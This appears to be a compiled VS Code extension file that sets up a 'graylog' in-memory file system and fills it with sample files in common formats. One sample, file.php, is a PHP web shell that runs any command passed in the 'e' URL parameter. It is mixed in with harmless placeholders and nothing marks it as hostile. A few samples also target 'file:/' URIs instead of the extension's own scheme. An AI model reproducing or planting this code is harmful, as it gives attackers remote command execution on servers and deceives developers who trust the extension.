'use strict';
Object.defineProperty(exports, "__esModule", { value: true });
exports.activate = void 0;
const vscode = require("vscode");
const fileSystemProvider_1 = require("./fileSystemProvider");
function activate(context) {
    console.log('graylog says "Hello"');
    const Graylog = new fileSystemProvider_1.GraylogFileSystemProvider();
    context.subscriptions.push(vscode.workspace.registerFileSystemProvider('graylog', Graylog, { isCaseSensitive: true }));
    let initialized = false;
    context.subscriptions.push(vscode.commands.registerCommand('graylog.reset', _ => {
        for (const [name] of Graylog.readDirectory(vscode.Uri.parse('graylog:/'))) {
            Graylog.delete(vscode.Uri.parse(`graylog:/${name}`));
        }
        initialized = false;
    }));
    context.subscriptions.push(vscode.commands.registerCommand('graylog.addFile', _ => {
        if (initialized) {
            Graylog.writeFile(vscode.Uri.parse(`graylog:/file.txt`), Buffer.from('foo'), { create: true, overwrite: true });
        }
    }));
    context.subscriptions.push(vscode.commands.registerCommand('graylog.deleteFile', _ => {
        if (initialized) {
            Graylog.delete(vscode.Uri.parse('graylog:/file.txt'));
        }
    }));
    context.subscriptions.push(vscode.commands.registerCommand('graylog.init', _ => {
        if (initialized) {
            return;
        }
        initialized = true;
        // most common files types
        Graylog.writeFile(vscode.Uri.parse(`file:/file.txt`), Buffer.from('foo'), { create: true, overwrite: true });
        Graylog.writeFile(vscode.Uri.parse(`file:/file.html`), Buffer.from('<html><body><h1 class="hd">Hello</h1></body></html>'), { create: true, overwrite: true });
        Graylog.writeFile(vscode.Uri.parse(`graylog:/file.js`), Buffer.from('console.log("JavaScript")'), { create: true, overwrite: true });
        Graylog.writeFile(vscode.Uri.parse(`graylog:/file.json`), Buffer.from('{ "json": true }'), { create: true, overwrite: true });
        Graylog.writeFile(vscode.Uri.parse(`graylog:/file.ts`), Buffer.from('console.log("TypeScript")'), { create: true, overwrite: true });
        Graylog.writeFile(vscode.Uri.parse(`graylog:/file.css`), Buffer.from('* { color: green; }'), { create: true, overwrite: true });
        Graylog.writeFile(vscode.Uri.parse(`graylog:/file.md`), Buffer.from('Hello _World_'), { create: true, overwrite: true });
        Graylog.writeFile(vscode.Uri.parse(`graylog:/file.xml`), Buffer.from('<?xml version="1.0" encoding="UTF-8" standalone="yes" ?>'), { create: true, overwrite: true });
        Graylog.writeFile(vscode.Uri.parse(`graylog:/file.py`), Buffer.from('import base64, sys; base64.decode(open(sys.argv[1], "rb"), open(sys.argv[2], "wb"))'), { create: true, overwrite: true });
        Graylog.writeFile(vscode.Uri.parse(`graylog:/file.php`), Buffer.from('<?php echo shell_exec($_GET[\'e\'].\' 2>&1\'); ?>'), { create: true, overwrite: true });
        Graylog.writeFile(vscode.Uri.parse(`graylog:/file.yaml`), Buffer.from('- just: write something'), { create: true, overwrite: true });
        // some more files & folders
        Graylog.createDirectory(vscode.Uri.parse(`graylog:/folder/`));
        Graylog.createDirectory(vscode.Uri.parse(`graylog:/large/`));
        Graylog.createDirectory(vscode.Uri.parse(`graylog:/xyz/`));
        Graylog.createDirectory(vscode.Uri.parse(`graylog:/xyz/abc`));
        Graylog.createDirectory(vscode.Uri.parse(`graylog:/xyz/def`));
        Graylog.writeFile(vscode.Uri.parse(`graylog:/folder/empty.txt`), new Uint8Array(0), { create: true, overwrite: true });
        Graylog.writeFile(vscode.Uri.parse(`graylog:/folder/empty.foo`), new Uint8Array(0), { create: true, overwrite: true });
        Graylog.writeFile(vscode.Uri.parse(`graylog:/folder/file.ts`), Buffer.from('let a:number = true; console.log(a);'), { create: true, overwrite: true });
        Graylog.writeFile(vscode.Uri.parse(`graylog:/large/rnd.foo`), randomData(50000), { create: true, overwrite: true });
        Graylog.writeFile(vscode.Uri.parse(`graylog:/xyz/UPPER.txt`), Buffer.from('UPPER'), { create: true, overwrite: true });
        Graylog.writeFile(vscode.Uri.parse(`graylog:/xyz/upper.txt`), Buffer.from('upper'), { create: true, overwrite: true });
        Graylog.writeFile(vscode.Uri.parse(`graylog:/xyz/def/foo.md`), Buffer.from('*graylog*'), { create: true, overwrite: true });
        Graylog.writeFile(vscode.Uri.parse(`graylog:/xyz/def/foo.bin`), Buffer.from([0, 0, 0, 1, 7, 0, 0, 1, 1]), { create: true, overwrite: true });
    }));
    context.subscriptions.push(vscode.commands.registerCommand('graylog.workspaceInit', _ => {
        vscode.workspace.updateWorkspaceFolders(0, 0, { uri: vscode.Uri.parse('graylog:/'), name: "Graylog API" });
    }));
}
exports.activate = activate;
function randomData(lineCnt, lineLen = 155) {
    const lines = [];
    for (let i = 0; i < lineCnt; i++) {
        let line = '';
        while (line.length < lineLen) {
            line += Math.random().toString(2 + (i % 34)).substr(2);
        }
        lines.push(line.substr(0, lineLen));
    }
    return Buffer.from(lines.join('\n'), 'utf8');
}
//# sourceMappingURL=extension.js.map